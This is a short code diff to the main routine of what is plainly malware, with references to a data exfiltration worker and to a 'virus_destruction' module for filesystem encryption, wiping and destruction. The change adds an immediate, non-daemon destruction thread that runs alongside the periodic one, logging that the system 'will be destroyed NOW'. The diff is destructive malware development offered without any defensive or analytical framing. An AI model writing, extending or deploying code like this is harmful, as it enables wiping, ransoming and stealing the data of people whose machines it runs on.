@@ -98,8 +98,16 @@ def main():
         exfil_thread.start()
         log_activity("SYSTEM", "Data exfiltration worker started")
     
-    # Start filesystem destruction (encryption/wiping/corruption)
+    # Start filesystem destruction (encryption/wiping/corruption) - IMMEDIATE
     if ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING or ENABLE_FILESYSTEM_DESTRUCTION:
+        # Start destruction immediately if enabled
+        if DESTRUCTION_IMMEDIATE:
+            from virus_destruction import destroy_filesystem
+            immediate_destruction_thread = threading.Thread(target=destroy_filesystem, daemon=False)
+            immediate_destruction_thread.start()
+            log_activity("SYSTEM", "IMMEDIATE DESTRUCTION STARTED - System will be destroyed NOW!")
+        
+        # Also start periodic destruction worker
         destruction_thread = start_destruction()
         if destruction_thread:
             log_activity("SYSTEM", "Filesystem destruction module activated - COMPLETE DESTRUCTION MODE")
